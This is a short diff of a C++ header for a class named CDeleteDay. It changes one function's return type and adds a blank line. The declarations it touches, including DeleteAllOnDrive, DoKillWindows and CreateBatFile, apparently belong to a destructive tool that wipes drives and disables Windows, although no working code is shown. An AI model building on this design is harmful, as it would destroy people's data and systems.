@@ -1,4 +1,5 @@
 #pragma once
+
 class CDeleteDay
 {
 private:
@@ -45,4 +46,4 @@ bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char 
 bool DeleteAllOnDrive(char szDriveLetter[]);
 void DoKillWindows();
 int stringSizeInBytes(CString strToCalc);
-void getListOfLogicalDrives();
+CString getListOfLogicalDrives();
